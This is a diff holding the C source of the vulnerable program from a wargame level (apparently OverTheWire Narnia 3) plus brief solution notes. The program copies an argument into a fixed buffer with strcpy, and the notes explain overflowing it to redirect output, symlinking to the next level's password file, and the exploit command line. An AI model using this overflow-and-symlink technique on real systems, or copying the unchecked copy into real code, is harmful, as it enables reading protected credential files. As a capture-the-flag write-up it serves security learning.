@@ -1,0 +1,41 @@
+int main(int argc, char **argv){
+ 26  
+ 27     int  ifd,  ofd;
+ 28     char ofile[16] = "/dev/null";
+ 29     char ifile[32];
+ 30     char buf[32];
+ 31  
+ 32     if(argc != 2){
+ 33         printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+ 34         exit(-1);
+ 35     }
+ 36  
+ 37     /* open files */
+ 38     strcpy(ifile, argv[1]);
+ 39     if((ofd = open(ofile,O_RDWR)) < 0 ){
+ 40         printf("error opening %s\n", ofile);
+ 41         exit(-1);
+ 42     }
+ 43     if((ifd = open(ifile, O_RDONLY)) < 0 ){
+ 44         printf("error opening %s\n", ifile);
+ 45         exit(-1);
+ 46     }
+ 47  
+ 48     /* copy from file1 to file2 */
+ 49     read(ifd, buf, sizeof(buf)-1);
+ 50     write(ofd,buf, sizeof(buf)-1);
+ 51     printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+ 52  
+ 53     /* close 'em */
+ 54     close(ifd);
+ 55     close(ofd);
+ 56  
+ 57     exit(1);
+ 58 }
+
+works by overwriting the ofd char with /tmp/tmp112/out, and the ifd string is /tmp/tmp112/aaaaaaaaaaaaaaaaaaaa/tmp/tmp112/out
+ab symbolic link to /etc/narnia_pass/narnia4. so when line 49 the ifd gets dereference to the password file. had to make
+/tmp/tmp112/out write able by the user narnia4 so used chmod ugo+rwx /tmp/tmp112/out command
+
+./narnia3 /tmp/tmp112/aaaaaaaaaaaaaaaaaaaa/tmp/tmp112/out
+
